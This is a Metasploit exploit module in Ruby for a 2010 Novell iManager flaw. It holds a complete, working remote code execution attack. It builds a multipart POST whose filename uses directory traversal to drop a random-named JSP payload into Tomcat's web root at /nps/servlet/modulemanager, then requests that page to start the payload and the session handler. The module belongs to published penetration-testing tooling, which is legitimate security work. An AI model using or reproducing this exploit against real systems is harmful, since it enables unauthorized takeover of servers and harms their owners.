##
# $Id: novell_imanager_upload.rb 10758 2010-10-19 22:54:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell iManager getMultiPartParameters Arbitrary File Upload',
			'Description'    => %q{
					This module exploits a directory traversal vulnerability which
				allows remote attackers to upload and execute arbitrary code.

				PortalModuleInstallManager
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10758 $',
			'Platform'       => [ 'win' ],
			'Privileged'     => true,
			'References'     =>
				[
					#[ 'CVE', '2010-??' ],
					[ 'OSVDB', '68320'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-190/' ],
					[ 'URL', 'http://www.novell.com/support/viewContent.do?externalId=7006515&sliceId=2' ],
				],
			'Targets'        =>
				[
					[ 'Universal Windows Target',
						{
							'Arch'     => ARCH_JAVA,
							'Payload'  =>
								{
									'DisableNops' => true,
								},
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 01 2010'
		))

		register_options(
			[
				Opt::RPORT(8080)
			], self.class )
	end

	def exploit

		page = Rex::Text.rand_text_alpha_upper(8) + ".jsp"

		fname = '../../../../../../../Progra~1/Novell/Tomcat/webapps/ROOT/'
		fname << page

		dbl = Rex::MIME::Message.new
		dbl.add_part(payload.encoded, "application/octet-stream", nil, "form-data; name=\"MODULE_FILE\"; filename=\"#{fname}\"")
		data = dbl.to_s
		# For some unknown reason, the service is unhappy with an extra EOL.
		data.strip!

		print_status("Uploading the payload via a POST request...")

		res = send_request_cgi(
			{
				'uri'     => '/nps/servlet/modulemanager',
				'version' => '1.1',
				'method'  => 'POST',
				'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
				'data'    => data,
			}, 5)

		if ( res and res.code == 200 and res.message =~ /OK/ )
			print_status("Sending our second request to '#{page}'...")
			data = send_request_raw({
					'uri'     => '/' + page,
					'method'  => 'GET',
					'version' => '1.0',
			}, 5)
			handler
		else
			raise RuntimeError, 'POST failed'
		end

	end
end